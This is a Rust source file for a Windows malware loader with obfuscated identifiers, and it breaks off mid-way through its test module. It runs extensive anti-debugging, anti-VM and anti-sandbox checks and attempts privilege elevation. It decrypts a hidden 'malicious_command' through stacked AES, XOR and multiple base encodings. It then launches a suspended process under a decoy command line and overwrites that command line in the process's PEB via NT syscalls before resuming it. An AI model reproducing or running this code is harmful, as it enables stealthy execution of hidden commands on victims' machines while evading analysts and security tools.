# ! [allow (non_snake_case)]
# ! [allow (unused_unsafe)]
mod power;
mod syscalls;
use anti_debug_rust;
use anti_sandbox;
use anti_vm;
use crate::anti_debug_rust::bad_processes;
use crate::anti_debug_rust::blacklisted_windows;
use crate::anti_debug_rust::debugger_detection;
use crate::anti_debug_rust::hooks_detection;
use crate::anti_debug_rust::parent_anti_debug;
use crate::anti_debug_rust::run_debug_checks;
use crate::anti_sandbox::admin_check;
use crate::anti_sandbox::all_tokens;
use crate::anti_sandbox::clean_environment_detection;
use crate::anti_sandbox::critical_process;
use crate::anti_sandbox::internet_check;
use crate::anti_sandbox::pc_uptime;
use crate::anti_sandbox::recent_file_activity;
use crate::anti_sandbox::repetitive_process;
use crate::anti_sandbox::run_environment_checks;
use crate::anti_sandbox::running_processes;
use crate::anti_sandbox::runtime_detector;
use crate::anti_sandbox::usb_check;
use crate::anti_sandbox::username_check;
use crate::anti_vm::anyrun_detection;
use crate::anti_vm::comodo_antivirus_detection;
use crate::anti_vm::deep_freeze_detection;
use crate::anti_vm::hyperv_check;
use crate::anti_vm::kvm_check;
use crate::anti_vm::monitor_metrics;
use crate::anti_vm::parallels_check;
use crate::anti_vm::qemu_check;
use crate::anti_vm::run_vm_checks;
use crate::anti_vm::sandboxie_detection;
use crate::anti_vm::shadow_defender_detection;
use crate::anti_vm::triage_detection;
use crate::anti_vm::virtualbox_detection;
use crate::anti_vm::vm_artifacts;
use crate::anti_vm::vm_platform_check;
use crate::anti_vm::vmware_detection;
use crate::syscalls::SYSCALLS;
use once_cell::sync::Lazy;
use power::run_all_checks;
use std::ffi::c_void;
use std::mem::size_of;
use std::mem::transmute;
use std::mem::zeroed;
use std::ptr::null_mut;
use windows_sys::Win32::Foundation::NTSTATUS;
use windows_sys::Win32::Foundation::UNICODE_STRING;
use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
use windows_sys::Win32::System::LibraryLoader::GetProcAddress;
use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
use windows_sys::Win32::System::Threading::CREATE_NEW_CONSOLE;
use windows_sys::Win32::System::Threading::CREATE_SUSPENDED;
use windows_sys::Win32::System::Threading::CreateProcessW;
use windows_sys::Win32::System::Threading::PEB;
use windows_sys::Win32::System::Threading::PROCESS_BASIC_INFORMATION;
use windows_sys::Win32::System::Threading::PROCESS_INFORMATION;
use windows_sys::Win32::System::Threading::PROCESS_INFORMATION_CLASS;
use windows_sys::Win32::System::Threading::STARTUPINFOW;

#[inline(never)]
fn checksum_yaz_tfouozq_nn(data: &[u8]) -> u64 {
    let mut a = 1u64;
    let mut b = 0u64;
    for &byte in data {
        a = (a.wrapping_add(byte as u64)) % 65521;
        b = (b.wrapping_add(a)) % 65521;
    }
    (b << 32) | a
}

fn decode_lzheqqnx_ibng(encrypted: &[u8], key: &[u8], expected_sum: u64) -> &'static str {
    let s: String = {
        use aes::cipher::{BlockDecrypt, KeyInit, generic_array::GenericArray};
        use aes::{Aes128, Aes192, Aes256};
        use base85; // using base85 for base85 decoding
        use bs58; // using bs58 for base58 decoding
        use base64::{engine::general_purpose, Engine as _};

        if key.len() < 88 { return Box::leak(String::from_utf8_lossy(encrypted).to_string().into_boxed_str()); }

        let xor_key = &key[0..16];
        let aes192_key = &key[16..40];
        let aes128_key = &key[40..56];
        let aes256_key = &key[56..88];

        let mut data = encrypted.to_vec();

        let cipher256 = Aes256::new(GenericArray::from_slice(aes256_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher256.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        let cipher128 = Aes128::new(GenericArray::from_slice(aes128_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher128.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        let cipher192 = Aes192::new(GenericArray::from_slice(aes192_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher192.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        if !data.is_empty() {
            let pad_len = data[data.len() - 1] as usize;
            if pad_len <= 16 && pad_len <= data.len() {
                data.truncate(data.len() - pad_len);
            }
        }

        let xor_decoded: Vec<u8> = data.iter().enumerate().map(|(i, &b)| b ^ xor_key[i % xor_key.len()]).collect();
        let hex_str = match String::from_utf8(xor_decoded) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base64_bytes = match hex::decode(&hex_str) { Ok(b) => b, Err(_) => return Box::leak(hex_str.into_boxed_str()) };
        let base64_str = match String::from_utf8(base64_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base32_bytes = match general_purpose::STANDARD.decode(&base64_str) { Ok(b) => b, Err(_) => return Box::leak(base64_str.into_boxed_str()) };
        let base32_str = match String::from_utf8(base32_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base58_bytes = match base32::decode(base32::Alphabet::Rfc4648 { padding: true }, &base32_str) { Some(b) => b, None => return Box::leak(base32_str.into_boxed_str()) };
        let base58_str = match String::from_utf8(base58_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base85_bytes = match bs58::decode(&base58_str).into_vec() { Ok(b) => b, Err(_) => return Box::leak(base58_str.into_boxed_str()) };
        let base85_str = match String::from_utf8(base85_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base45_bytes = match base85::decode(&base85_str) { Ok(b) => b, Err(_) => return Box::leak(base85_str.into_boxed_str()) };
        let base45_str = match String::from_utf8(base45_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };

        match base45::decode(&base45_str) {
            Ok(final_bytes) => {
                let runtime_sum = checksum_yaz_tfouozq_nn(&final_bytes);
                if runtime_sum != expected_sum {
                    // Tampering detected! Simulated volatile write (to valid memory) then abort.
                    unsafe {
                        let mut dummy: u8 = 0;
                        std::ptr::write_volatile(&mut dummy, 1);
                    }
                    std::process::abort();
                }
                String::from_utf8_lossy(&final_bytes).to_string()
            },
            Err(_) => base45_str,
        }
    };
    Box::leak(s.into_boxed_str())
}

        fn yqklqfnc (s : & str) -> Vec < u16 > { s . encode_utf16 () . collect () } fn ycuzrm_lk (s : & str , total_width : usize , padding_char : u16) -> Vec < u16 > { let mut wide = yqklqfnc (s) ; if wide . len () < total_width { wide . resize (total_width , padding_char) ; } wide } fn gryczszf () { if ry_cshwk_r () { } let malicious_command = decode_lzheqqnx_ibng (& [18 , 3 , 173 , 134 , 51 , 117 , 205 , 114 , 104 , 160 , 174 , 251 , 140 , 117 , 67 , 139 , 188 , 61 , 51 , 138 , 27 , 45 , 91 , 92 , 17 , 222 , 5 , 16 , 13 , 165 , 150 , 178 , 98 , 41 , 31 , 217 , 146 , 20 , 7 , 156 , 104 , 173 , 64 , 249 , 203 , 35 , 214 , 88 , 162 , 10 , 117 , 244 , 184 , 25 , 254 , 110 , 22 , 20 , 28 , 196 , 22 , 219 , 220 , 80 , 251 , 119 , 231 , 41 , 48 , 141 , 208 , 218 , 125 , 103 , 32 , 67 , 17 , 90 , 254 , 255 , 164 , 172 , 86 , 17 , 165 , 97 , 208 , 83 , 220 , 105 , 133 , 33 , 103 , 223 , 201 , 79 , 254 , 190 , 236 , 45 , 173 , 38 , 155 , 255 , 26 , 22 , 145 , 191 , 107 , 85 , 205 , 43 , 15 , 219 , 176 , 176 , 92 , 156 , 19 , 160 , 217 , 251 , 120 , 220 , 196 , 213 , 239 , 228 , 205 , 79 , 76 , 68 , 121 , 114 , 97 , 191 , 74 , 246 , 57 , 131 , 19 , 227 , 21 , 93 , 209 , 86 , 134 , 248 , 13 , 156 , 97 , 25 , 153 , 209 , 124 , 54 , 85 , 36 , 57 , 205 , 209 , 104 , 206 , 104 , 63 , 84 , 146 , 223 , 236 , 46 , 244 , 246 , 148 , 6 , 204 , 249 , 163 , 56 , 40 , 229 , 167 , 70 , 242 , 19 , 177 , 165 , 74 , 108 , 91 , 8 , 133 , 153 , 233 , 129 , 141 , 110 , 70 , 107 , 242 , 63 , 94 , 163 , 15 , 101 , 111 , 61 , 58 , 161 , 74 , 6 , 86 , 139 , 106 , 196 , 155 , 99 , 147 , 164 , 124 , 200 , 162 , 197 , 247 , 255 , 131 , 219 , 184 , 138 , 63 , 223 , 163 , 48 , 220 , 170 , 144 , 36 , 199 , 224 , 44 , 203 , 237 , 131 , 85 , 107 , 105 , 59 , 65 , 148 , 23 , 98 , 106 , 87 , 119 , 165 , 138 , 225 , 112 , 111 , 78 , 37 , 101 , 28 , 191 , 21 , 207 , 54 , 42 , 192 , 225 , 108 , 78 , 43 , 207 , 151 , 152 , 43 , 152 , 14 , 124 , 0 , 119 , 169 , 113 , 167 , 167 , 86 , 128 , 21 , 120 , 194 , 109 , 140 , 97 , 41 , 131 , 169 , 172 , 116 , 247 , 197 , 108 , 12 , 236 , 208 , 85 , 205 , 86 , 223 , 163 , 168 , 162 , 160 , 186 , 102 , 90 , 176 , 0 , 53 , 148 , 120 , 27 , 94 , 60 , 197 , 40 , 236 , 149 , 146 , 16 , 252 , 133 , 111 , 221 , 156 , 8 , 246 , 90 , 82 , 24 , 221 , 211 , 249 , 90 , 31 , 86 , 109 , 188 , 185 , 149 , 112 , 134 , 194 , 169 , 111 , 96 , 130 , 145 , 64 , 143 , 117 , 162 , 251 , 235 , 240 , 140 , 254 , 139 , 75 , 252 , 6 , 107 , 139 , 108 , 204 , 62 , 82 , 113 , 168 , 101 , 154 , 129 , 81 , 103 , 6 , 111 , 245 , 251 , 229 , 67 , 250 , 45 , 255 , 30 , 99 , 214 , 140 , 34 , 200 , 91 , 152 , 145 , 37 , 122 , 85 , 163 , 34 , 139 , 54 , 224 , 236 , 238 , 107 , 165 , 96 , 66 , 70 , 111 , 196 , 195 , 84 , 88 , 231 , 63 , 240 , 242 , 168 , 130 , 16 , 3 , 31 , 128 , 133 , 251 , 245 , 141 , 114 , 205 , 216 , 212 , 65 , 155 , 11 , 79 , 96 , 213 , 140 , 18 , 220 , 120 , 182 , 243 , 32 , 205 , 108 , 29 , 147 , 135 , 0 , 81 , 38 , 151 , 105 , 238 , 239 , 53 , 6 , 230 , 37 , 198 , 55 , 122 , 174 , 71 , 39 , 146 , 69 , 65 , 90 , 127 , 77 , 71 , 230 , 125 , 236 , 220 , 43 , 68 , 36 , 81 , 167 , 51 , 81 , 46 , 48 , 26 , 150 , 99 , 96 , 194 , 167 , 135 , 227 , 64 , 109 , 224 , 141 , 80 , 153 , 9 , 182 , 213 , 197 , 163 , 167 , 125 , 213 , 103 , 41 , 110 , 39 , 42 , 93 , 138 , 85 , 211 , 65 , 178 , 12 , 221 , 135 , 247 , 167 , 231 , 238 , 37 , 142 , 189 , 32 , 132 , 244 , 150 , 231 , 5 , 34 , 40 , 17 , 81 , 182 , 201 , 103 , 202 , 109 , 220 , 48 , 176 , 25 , 228 , 228 , 27 , 234 , 160 , 208 , 128 , 200 , 16 , 249 , 37 , 167 , 38 , 45 , 215 , 147 , 205 , 228 , 190 , 0 , 240 , 192 , 254 , 153 , 126 , 130 , 72 , 50 , 242 , 119 , 88 , 107 , 114 , 56 , 54 , 175 , 168 , 47 , 233 , 85 , 12 , 165 , 186 , 35 , 38 , 158 , 208 , 175 , 37 , 203 , 37 , 159 , 93 , 34 , 196 , 63 , 106 , 134 , 121 , 48 , 238 , 237 , 106 , 137 , 192 , 33 , 97 , 222 , 94 , 163 , 96 , 42 , 155 , 215 , 46 , 108 , 217 , 183 , 173 , 96 , 149 , 209 , 73 , 164 , 135 , 251 , 177 , 172 , 100 , 181 , 211 , 70 , 83 , 169 , 14 , 134 , 60 , 47 , 225 , 65 , 107 , 152 , 236 , 247 , 244 , 5 , 178 , 216 , 122 , 187 , 122 , 114 , 39 , 20 , 94 , 23 , 185 , 120 , 77 , 253 , 38 , 239 , 40 , 84 , 206 , 229 , 44 , 122 , 59 , 145 , 196 , 137 , 50 , 150 , 57 , 98 , 131 , 220 , 105 , 52 , 184 , 245 , 69 , 2 , 234 , 199 , 134 , 3 , 192 , 58 , 249 , 102 , 123 , 191 , 180 , 10 , 23 , 185 , 203 , 42 , 195 , 35 , 233 , 162 , 184 , 117 , 79 , 199 , 91 , 151 , 138 , 121 , 103 , 61 , 173 , 226 , 48 , 74 , 253 , 176 , 27 , 197 , 30 , 255 , 198 , 199 , 195 , 104 , 96 , 194 , 246 , 183 , 5 , 190 , 176 , 46 , 158 , 26 , 41 , 94 , 105 , 215 , 85 , 231 , 208 , 80 , 70 , 128 , 237 , 212 , 141 , 242 , 6 , 164 , 135 , 126 , 134 , 193 , 91 , 130 , 5 , 79 , 65 , 178 , 139 , 54 , 82 , 183 , 56 , 187 , 26 , 70 , 11 , 205 , 40 , 80 , 28 , 242 , 41 , 220 , 166 , 166 , 244 , 235 , 33 , 134 , 83 , 75 , 152 , 213 , 10 , 162 , 180 , 137 , 36 , 63 , 42 , 231 , 216 , 2 , 123 , 121 , 192 , 20 , 113 , 224 , 15 , 183 , 52 , 101 , 158 , 141 , 196 , 73 , 154 , 218 , 143 , 196 , 20 , 214 , 224 , 23 , 146 , 225 , 250 , 100 , 21 , 52 , 94 , 55 , 174 , 54 , 199 , 221 , 71 , 188 , 115 , 204 , 252 , 25 , 118 , 26 , 115 , 200 , 224 , 129 , 111 , 148 , 191 , 36 , 120 , 207 , 227 , 172 , 153 , 46 , 72 , 210 , 21 , 42 , 53 , 49 , 2 , 220 , 2 , 227 , 246 , 236 , 250 , 58 , 143 , 45 , 201 , 133 , 220 , 21 , 23 , 84 , 221 , 140 , 184 , 147 , 183 , 9 , 167 , 131 , 115 , 124 , 61 , 224 , 174 , 134 , 101 , 218 , 166 , 105 , 110 , 121 , 111 , 106 , 26 , 64 , 142 , 5 , 66 , 13 , 93 , 153 , 73 , 168 , 239 , 171 , 12 , 104 , 61 , 155 , 54 , 186 , 162 , 110 , 53 , 151 , 92 , 128 , 144 , 146 , 35 , 66 , 148 , 174 , 72 , 203 , 166 , 1 , 238 , 61 , 177 , 240 , 228 , 37 , 15 , 227 , 161 , 158 , 150 , 163 , 233 , 197 , 95 , 194 , 47 , 191 , 239 , 6 , 220 , 167 , 241 , 243 , 37 , 96 , 112 , 212 , 155 , 130 , 223 , 189 , 180 , 76 , 26 , 244 , 10 , 96 , 166 , 113 , 76 , 69 , 111 , 51 , 202 , 186 , 57 , 203 , 166 , 115 , 163 , 90 , 21 , 72 , 41 , 222 , 184 , 101 , 107 , 251 , 82 , 189 , 102 , 109 , 59 , 212 , 71 , 34 , 232 , 134 , 186 , 151 , 204 , 186 , 44 , 115 , 99 , 20 , 226 , 157 , 42 , 0 , 180 , 140 , 57 , 234 , 139 , 37 , 40 , 26 , 61 , 211 , 83 , 53 , 214 , 246 , 59 , 107 , 62 , 39 , 178 , 233 , 27 , 55 , 49 , 109 , 98 , 38 , 246 , 147 , 76 , 167 , 184 , 97 , 60 , 21 , 53 , 249 , 111 , 79 , 13 , 14 , 32 , 165 , 220 , 171 , 249 , 23 , 54 , 47 , 73 , 141 , 3 , 0 , 89 , 188 , 209 , 122 , 127 , 170 , 47 , 138 , 247 , 243 , 56 , 219 , 208 , 24 , 96 , 94 , 146 , 105 , 40 , 105 , 7 , 205 , 235 , 241 , 224 , 184 , 38 , 15 , 57 , 146 , 173 , 10 , 228 , 161 , 113 , 95 , 23 , 216 , 80 , 69 , 118 , 55 , 229 , 42 , 120 , 147 , 60 , 137 , 32 , 64 , 103 , 78 , 104 , 184 , 169 , 183 , 100 , 206 , 182 , 189 , 148 , 233 , 193 , 9 , 161 , 143 , 42 , 117] , & [90 , 139 , 43 , 215 , 56 , 234 , 199 , 22 , 174 , 51 , 62 , 238 , 228 , 12 , 138 , 104 , 122 , 154 , 213 , 75 , 183 , 130 , 156 , 197 , 77 , 96 , 41 , 143 , 215 , 182 , 76 , 210 , 166 , 50 , 38 , 104 , 75 , 59 , 98 , 27 , 2 , 104 , 18 , 245 , 229 , 175 , 138 , 239 , 80 , 231 , 136 , 57 , 248 , 116 , 106 , 7 , 206 , 188 , 37 , 247 , 38 , 121 , 200 , 64 , 46 , 215 , 53 , 16 , 9 , 46 , 93 , 174 , 215 , 46 , 55 , 86 , 55 , 194 , 187 , 165 , 39 , 50 , 53 , 109 , 201 , 77 , 223 , 43] , 118846040056799u64) ; let malicious_command_wide = yqklqfnc (& malicious_command) ; let spoofed_command_str = decode_lzheqqnx_ibng (& [50 , 23 , 186 , 14 , 191 , 255 , 109 , 66 , 192 , 25 , 90 , 100 , 227 , 89 , 41 , 107 , 18 , 190 , 5 , 175 , 178 , 98 , 82 , 100 , 142 , 62 , 203 , 47 , 102 , 32 , 186 , 238 , 222 , 181 , 98 , 225 , 95 , 184 , 127 , 150 , 205 , 67 , 217 , 116 , 154 , 41 , 191 , 28 , 20 , 104 , 114 , 76 , 214 , 127 , 145 , 5 , 221 , 179 , 101 , 156 , 106 , 198 , 174 , 138 , 22 , 195 , 30 , 178 , 13 , 14 , 55 , 6 , 201 , 22 , 12 , 222 , 58 , 242 , 218 , 9 , 223 , 79 , 131 , 40 , 174 , 153 , 179 , 170 , 250 , 147 , 189 , 113 , 53 , 137 , 220 , 126 , 198 , 230 , 205 , 81 , 225 , 237 , 83 , 7 , 17 , 198 , 232 , 136 , 27 , 90 , 75 , 92 , 224 , 49 , 115 , 15 , 217 , 88 , 223 , 242 , 169 , 4 , 51 , 111 , 141 , 78 , 87 , 5 , 103 , 44 , 163 , 192 , 37 , 137 , 146 , 27 , 232 , 210 , 51 , 197 , 137 , 233 , 207 , 235 , 157 , 201 , 140 , 65 , 181 , 12 , 33 , 47 , 206 , 255 , 235 , 51 , 204 , 97 , 1 , 108 , 114 , 189 , 88 , 106 , 1 , 218 , 36 , 222 , 237 , 194 , 48 , 5 , 73 , 51 , 6 , 155 , 64 , 178 , 123 , 39 , 14 , 139 , 134 , 139 , 107 , 123 , 94 , 92 , 176 , 230 , 50 , 247] , & [117 , 236 , 70 , 217 , 43 , 207 , 40 , 35 , 141 , 10 , 6 , 63 , 59 , 35 , 10 , 244 , 143 , 233 , 142 , 125 , 187 , 180 , 237 , 240 , 230 , 149 , 143 , 126 , 197 , 148 , 110 , 241 , 103 , 195 , 86 , 81 , 6 , 101 , 0 , 160 , 43 , 175 , 88 , 153 , 45 , 164 , 83 , 210 , 115 , 60 , 101 , 100 , 203 , 111 , 139 , 13 , 252 , 69 , 215 , 9 , 218 , 49 , 181 , 84 , 212 , 198 , 143 , 168 , 205 , 41 , 59 , 213 , 164 , 89 , 117 , 198 , 237 , 165 , 236 , 209 , 166 , 115 , 245 , 224 , 143 , 56 , 97 , 191] , 48507360642486u64) ; let mut spoofed_command_wide = ycuzrm_lk (spoofed_command_str , malicious_command . len () , ' ' as u16) ; spoofed_command_wide . push (0) ; let mut si : STARTUPINFOW = unsafe { zeroed () } ; si . cb = size_of :: < STARTUPINFOW > () as u32 ; let mut sa : SECURITY_ATTRIBUTES = unsafe { zeroed () } ; sa . nLength = size_of :: < SECURITY_ATTRIBUTES > () as u32 ; let mut pi : PROCESS_INFORMATION = unsafe { zeroed () } ; let mut current_dir = yqklqfnc (decode_lzheqqnx_ibng (& [142 , 145 , 158 , 212 , 207 , 83 , 55 , 141 , 172 , 208 , 33 , 88 , 242 , 129 , 160 , 26 , 129 , 193 , 4 , 37 , 57 , 136 , 72 , 146 , 215 , 198 , 236 , 89 , 238 , 15 , 141 , 79 , 185 , 17 , 153 , 205 , 224 , 167 , 137 , 136 , 36 , 244 , 14 , 166 , 76 , 51 , 172 , 168 , 14 , 249 , 178 , 65 , 213 , 233 , 246 , 137 , 233 , 123 , 210 , 152 , 54 , 85 , 189 , 48 , 238 , 83 , 134 , 177 , 168 , 191 , 69 , 45 , 53 , 90 , 252 , 53 , 253 , 170 , 169 , 34 , 24 , 1 , 49 , 90 , 196 , 192 , 1 , 181 , 42 , 22 , 136 , 35 , 83 , 58 , 251 , 3 , 75 , 46 , 136 , 183 , 21 , 152 , 40 , 188 , 174 , 54 , 201 , 86 , 71 , 190 , 9 , 31 , 0 , 250 , 31 , 163 , 157 , 72 , 107 , 75 , 201 , 98 , 182 , 231 , 204 , 56 , 21 , 214 , 146 , 222 , 179 , 234 , 246 , 155 , 144 , 27 , 24 , 3 , 74 , 94 , 232 , 139 , 155 , 167] , & [161 , 165 , 175 , 79 , 163 , 195 , 103 , 129 , 251 , 83 , 9 , 161 , 227 , 239 , 122 , 183 , 131 , 7 , 156 , 141 , 49 , 58 , 88 , 190 , 113 , 37 , 98 , 85 , 96 , 218 , 96 , 152 , 0 , 88 , 8 , 125 , 216 , 98 , 178 , 41 , 144 , 26 , 164 , 207 , 43 , 200 , 0 , 43 , 207 , 87 , 72 , 88 , 214 , 178 , 187 , 137 , 61 , 219 , 177 , 44 , 234 , 24 , 114 , 229 , 25 , 97 , 0 , 128 , 70 , 207 , 14 , 101 , 21 , 89 , 231 , 37 , 139 , 146 , 226 , 56 , 108 , 161 , 83 , 248 , 70 , 40 , 160 , 233] , 26310969656385u64)) ; current_dir . push (0) ; let success = unsafe { CreateProcessW (null_mut () , spoofed_command_wide . as_mut_ptr () , & mut sa , & mut sa , 0 , CREATE_SUSPENDED | CREATE_NEW_CONSOLE , null_mut () , current_dir . as_ptr () , & mut si , & mut pi ,) } ; if success == 0 { return ; } let mut pbi : PROCESS_BASIC_INFORMATION = unsafe { zeroed () } ; let mut return_length : u32 = 0 ; let status : NTSTATUS = (efun_ms_tn . NtQueryInformationProcess) (pi . hProcess as * mut c_void , 0 as PROCESS_INFORMATION_CLASS , & mut pbi as * mut _ as * mut c_void , size_of :: < PROCESS_BASIC_INFORMATION > () as u32 , & mut return_length) ; if status != 0 { unsafe { let _ = (efun_ms_tn . NtClose) (pi . hProcess as * mut c_void) ; let _ = (efun_ms_tn . NtClose) (pi . hThread as * mut c_void) ; } return ; } let mut peb : PEB = unsafe { zeroed () } ; let mut bytes_read : usize = 0 ; let status = unsafe { (efun_ms_tn . NtReadVirtualMemory) (pi . hProcess as * mut c_void , pbi . PebBaseAddress as * mut c_void , & mut peb as * mut _ as * mut c_void , size_of :: < PEB > () , & mut bytes_read) } ; if status != 0 || bytes_read != size_of :: < PEB > () { unsafe { let _ = (efun_ms_tn . NtClose) (pi . hProcess as * mut c_void) ; let _ = (efun_ms_tn . NtClose) (pi . hThread as * mut c_void) ; } return ; } # [repr (C)] struct Params { _filler : [u8 ; (35 + 77)] , CommandLine : UNICODE_STRING , } let mut proc_params : Params = unsafe { zeroed () } ; let status = unsafe { (efun_ms_tn . NtReadVirtualMemory) (pi . hProcess as * mut c_void , peb . ProcessParameters as * mut c_void , & mut proc_params as * mut _ as * mut c_void , size_of :: < Params > () , & mut bytes_read) } ; if status != 0 || bytes_read != size_of :: < Params > () { unsafe { let _ = (efun_ms_tn . NtClose) (pi . hProcess as * mut c_void) ; let _ = (efun_ms_tn . NtClose) (pi . hThread as * mut c_void) ; } return ; } let mut bytes_written : usize = 0 ; let status = unsafe { (efun_ms_tn . NtWriteVirtualMemory) (pi . hProcess as * mut c_void , proc_params . CommandLine . Buffer as * mut c_void , malicious_command_wide . as_ptr () as * mut c_void , malicious_command_wide . len () * 2 , & mut bytes_written) } ; if status != 0 { unsafe { let _ = (efun_ms_tn . NtClose) (pi . hProcess as * mut c_void) ; let _ = (efun_ms_tn . NtClose) (pi . hThread as * mut c_void) ; } return ; } let cmd_line_len = (spoofed_command_str . len () * 2) as u16 ; let status = unsafe { let len_address = (peb . ProcessParameters as * mut u8) . add ((49 + 63)) ; (efun_ms_tn . NtWriteVirtualMemory) (pi . hProcess as * mut c_void , len_address as * mut c_void , & cmd_line_len as * const _ as * mut c_void , size_of :: < u16 > () , & mut bytes_written) } ; if status != 0 { unsafe { let _ = (efun_ms_tn . NtClose) (pi . hProcess as * mut c_void) ; let _ = (efun_ms_tn . NtClose) (pi . hThread as * mut c_void) ; } return ; } unsafe { let mut suspend_count : u32 = 0 ; let _ = (efun_ms_tn . NtResumeThread) (pi . hThread as * mut c_void , & mut suspend_count) ; let _ = (efun_ms_tn . NtClose) (pi . hProcess as * mut c_void) ; let _ = (efun_ms_tn . NtClose) (pi . hThread as * mut c_void) ; } }          pub fn fjazrmlx () -> bool { if ! runtime_detector :: is_windows () { return false ; } if ! admin_check :: is_admin () { if let Err (_) = admin_check :: elevate_process () { } } if admin_check :: is_admin () { let _ = all_tokens :: enable () ; } ry_cshwk_r () } pub fn cevcg_ns_d () -> bool { if ! runtime_detector :: is_windows () { return false ; } if run_debug_checks () { return true ; } if run_vm_checks () { return true ; } if run_environment_checks () { return true ; } if bmy_oza_fa () { return true ; } false } pub fn ry_cshwk_r () -> bool { if debugger_detection :: is_debugger_present () { println ! ("[anti_debug_rust] debugger_detection::is_debugger_present") ; return true ; } if debugger_detection :: check_remote_debugger () . unwrap_or (false) { println ! ("[anti_debug_rust] debugger_detection::check_remote_debugger") ; return true ; } if parent_anti_debug :: parent_anti_debug () { println ! ("[anti_debug_rust] parent_anti_debug::parent_anti_debug") ; return true ; } if pc_uptime :: check_uptime ((66 + 534)) . unwrap_or (false) { println ! ("[anti_sandbox] pc_uptime::check_uptime") ; return true ; } if bad_processes :: detect () . unwrap_or (false) { println ! ("[anti_debug_rust] bad_processes::detect") ; return true ; } if running_processes :: check_running_processes_count ((24 + 26)) . unwrap_or (false) { println ! ("[anti_sandbox] running_processes::check_running_processes_count") ; return true ; } if blacklisted_windows :: check_blacklisted_windows () { println ! ("[anti_debug_rust] blacklisted_windows::check_blacklisted_windows") ; return true ; } if hooks_detection :: detect_hooks_on_common_winapi_functions (None , None) { println ! ("[anti_debug_rust] hooks_detection::detect_hooks_on_common_winapi_functions") ; return true ; } if shadow_defender_detection :: detect_shadow_defender () { println ! ("[anti_vm] shadow_defender_detection::detect_shadow_defender") ; return true ; } if anyrun_detection :: anyrun_detection () . unwrap_or (false) { println ! ("[anti_sandbox] anyrun_detection::anyrun_detection") ; return true ; } if ! clean_environment_detection :: detect_clean_environment () { println ! ("[anti_sandbox] clean_environment_detection::detect_clean_environment (too clean)") ; return true ; } if comodo_antivirus_detection :: detect_comodo_antivirus () { println ! ("[anti_sandbox] comodo_antivirus_detection::detect_comodo_antivirus") ; return true ; } if deep_freeze_detection :: detect_deep_freeze () { println ! ("[anti_vm] deep_freeze_detection::detect_deep_freeze") ; return true ; } if hyperv_check :: detect_hyperv () . unwrap_or (false) { println ! ("[anti_vm] hyperv_check::detect_hyperv") ; return true ; } if kvm_check :: check_for_kvm () . unwrap_or (false) { println ! ("[anti_vm] kvm_check::check_for_kvm") ; return true ; } if monitor_metrics :: is_screen_small () . unwrap_or (false) { println ! ("[anti_sandbox] monitor_metrics::is_screen_small") ; return true ; } if parallels_check :: check_for_parallels () . unwrap_or (false) { println ! ("[anti_vm] parallels_check::check_for_parallels") ; return true ; } if qemu_check :: check_for_qemu () . unwrap_or (false) { println ! ("[anti_vm] qemu_check::check_for_qemu") ; return true ; } if recent_file_activity :: recent_file_activity_check () . unwrap_or (false) { println ! ("[anti_sandbox] recent_file_activity::recent_file_activity_check") ; return true ; } if repetitive_process :: check () . unwrap_or (false) { println ! ("[anti_sandbox] repetitive_process::check") ; return true ; } if sandboxie_detection :: detect_sandboxie () { println ! ("[anti_sandbox] sandboxie_detection::detect_sandboxie") ; return true ; } if triage_detection :: triage_check () . unwrap_or (false) { println ! ("[anti_sandbox] triage_detection::triage_check") ; return true ; } if usb_check :: plugged_in () . unwrap_or (true) == false { println ! ("[anti_sandbox] usb_check::plugged_in (no USB devices)") ; return true ; } if username_check :: check_for_blacklisted_names () { println ! ("[anti_sandbox] username_check::check_for_blacklisted_names") ; return true ; } if virtualbox_detection :: graphics_card_check () . unwrap_or (false) { println ! ("[anti_vm] virtualbox_detection::graphics_card_check") ; return true ; } if vm_artifacts :: vm_artifacts_detect () { println ! ("[anti_vm] vm_artifacts::vm_artifacts_detect") ; return true ; } if vm_platform_check :: detect_vm_platform () . unwrap_or (false) { println ! ("[anti_vm] vm_platform_check::detect_vm_platform") ; return true ; } if vmware_detection :: graphics_card_check () . unwrap_or (false) { println ! ("[anti_vm] vmware_detection::graphics_card_check") ; return true ; } if internet_check :: check_connection () . unwrap_or (true) == false { println ! ("[anti_sandbox] internet_check::check_connection") ; return true ; } false } pub fn bmy_oza_fa () -> bool { bad_processes :: detect () . unwrap_or (false) || blacklisted_windows :: check_blacklisted_windows () } pub struct vsdsvpo_s { pub enable_debug_checks : bool , pub enable_vm_checks : bool , pub enable_environment_checks : bool , pub enable_process_checks : bool , pub min_uptime_seconds : u32 , pub min_process_count : usize , pub min_installed_programs : usize , pub enable_internet_check : bool , pub enable_usb_check : bool , pub enable_admin_escalation : bool , pub enable_privilege_escalation : bool , pub enable_critical_process : bool , } impl Default for vsdsvpo_s { fn default () -> Self { Self { enable_debug_checks : true , enable_vm_checks : true , enable_environment_checks : true , enable_process_checks : true , min_uptime_seconds : (181 + 419) , min_process_count : (9 + 41) , min_installed_programs : 10 , enable_internet_check : true , enable_usb_check : true , enable_admin_escalation : true , enable_privilege_escalation : true , enable_critical_process : true , } } } # [cfg (test)] mod tests { # [test] fn gjkofimf () { println ! ("Detected OS: {:?}" , runtime_detector :: detect_os ()) ; assert_eq ! (runtime_detector :: is_windows () , cfg ! (windows)) ; } # [test] fn dodjopah () { println ! ("Running as admin: {}" , admin_check :: is_admin ()) ; } # [test] fn kqnchtmf () { println ! ("Debugger present: {}" , debugger_detection :: is_debugger_present ()) ; } # [test] fn esba_curs () { if let Ok (result) = debugger_detection :: check_remote_debugger () { println ! ("Remote debugger present: {}" , result) ; } } # [test] fn zjastcfm () { println ! ("Suspicious parent process: {}" , parent_anti_debug :: parent_anti_debug 